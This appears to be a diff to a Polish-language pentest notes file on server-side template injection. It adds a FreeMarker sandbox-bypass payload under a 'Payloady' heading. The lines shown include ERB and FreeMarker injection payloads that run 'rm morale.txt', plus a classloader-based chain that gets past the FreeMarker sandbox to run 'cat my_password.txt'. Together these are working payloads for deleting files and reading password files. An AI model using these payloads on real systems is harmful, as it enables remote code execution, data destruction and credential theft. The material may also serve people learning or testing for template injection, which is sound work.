@@ -573,9 +573,17 @@ http://vulnerable-website.com/?username=${7*7}
 ```
 ## Payloady:
 ### Freemaker
-```freemaker
+```java
 <%= system("rm morale.txt") %> -> RUBY ERC
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
+```
+#### Sandbox bypass
+```java
+<#assign classloader=accessible_class.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("cat my_password.txt")}
 ```
 
 ### handlebars
